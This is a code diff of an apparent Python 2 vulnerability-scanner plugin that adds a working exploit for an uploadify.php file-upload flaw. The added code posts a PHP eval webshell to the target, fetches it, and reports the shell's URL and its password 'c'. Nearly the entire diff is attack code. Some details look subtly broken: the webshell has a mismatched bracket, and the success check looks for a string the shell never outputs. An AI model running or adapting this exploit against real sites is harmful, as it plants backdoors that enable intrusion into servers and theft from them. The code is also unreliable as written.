@@ -71,7 +71,47 @@ Button
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        self.verify()
+        try:
+            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
+                target=self.target, vuln=self.vuln))
+            
+            #__Refer___ = http://wooyun.org/bugs/wooyun-2015-0141209
+            hh = hackhttp.hackhttp()
+            p = urlparse.urlparse(self.target)
+            raw = """
+POST /Public/uploadify/uploadify.php HTTP/1.1
+Host: {netloc}
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=---------------------------32382156818478
+Content-Length: 337
+
+-----------------------------32382156818478
+Content-Disposition: form-data; name=\"Filedata\"; filename=\"2.php\"
+Content-Type: application/octet-stream
+
+<?php
+@eval($_POST[c);
+?>
+-----------------------------32382156818478
+Content-Disposition: form-data; name=\"Button1\"
+
+Button
+-----------------------------32382156818478--"""
+            code, head, res, errcode, _ = hh.http(self.target + '/Public/uploadify/uploadify.php',raw=raw.format(netloc=p.netloc));
+            if code == 200 and res:
+                    file_url = 'http://%s/Public/uploadify/uploads/%s'%(p.netloc, res)
+                    code, head, res, errcode, _ = hh.http(file_url)
+                    if 'testvul~test' in res:
+                        #security_hole(arg+":Upload File at "+file_url)
+                        self.output.report(self.vuln, '发现{target}存在{name}漏洞，已上传webshell地址:{url}密码为c,请及时删除。'.format(
+                            target=self.target, name=self.vuln.name, url=file_url))
+
+        except Exception, e:
+            self.output.info('执行异常{}'.format(e))
 
 if __name__ == '__main__':
     Poc().run()
